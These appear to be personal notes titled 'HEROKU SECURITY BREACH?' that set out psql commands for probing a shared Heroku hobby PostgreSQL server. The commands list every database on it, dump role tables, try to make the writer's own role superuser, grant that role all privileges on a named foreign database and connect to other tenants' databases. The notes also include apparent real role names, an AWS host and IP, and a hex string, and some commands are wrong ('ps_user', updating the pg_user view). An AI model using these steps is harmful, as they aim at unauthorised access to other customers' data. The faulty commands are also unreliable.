# HEROKU SECURITY BREACH?

Last Edited: December 19, 2019 11:43 PM

Hobby Basic Heroku:

PostgreSQL 10.3 (Ubuntu 10.3-1.pgdg14.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 4.8.4-2ubuntu1~14.04.4) 4.8.4, 64-bit

List all Postgres Database Instances on Heroku

$ heroku run psql -d <DATABASE URI>

=># \l

Show Roles:

*rolname | rolsuper | rolinherit | rolcreaterole | rolcreatedb | rolcanlogin | rolreplication | rolconnlimit | rolpassword

$ SELECT * FROM pg_roles;

Heroku Super Roles

=># postgres, u7g79dnin8kgc5

ALL DATABASE USERS

$ SELECT * FROM ps_user;

UPDATE USER:

$ UPDATE pg_user SET usesuper = 't' WHERE usename = 'hlmvsamnvybvfm';

SHOW USER COLUMNS

$ \d pg_user

CONNECT TO ANOTHER DATABASE

$ \connect <database>;

Grant

$ GRANT ALL PRIVILEGES ON DATABASE <database-name> TO <MYUSER:hlmvsamnvybvfm>;

Try to connect to another Database

$ heroku run psql -d [postgres://](postgres://ihnnadpcwquohy)<username>:<password>[@](mailto:caf702d2f5f130f0e9dc07b169501701c1c22212b28001eb17de273704750440@ec2-174-129-22-84.compute-1.amazonaws.com)<host>:<port>/<database-name>

GRANT ALL PRIVILEGES ON DATABASE "d4kne923jnvpjo" to hlmvsamnvybvfm;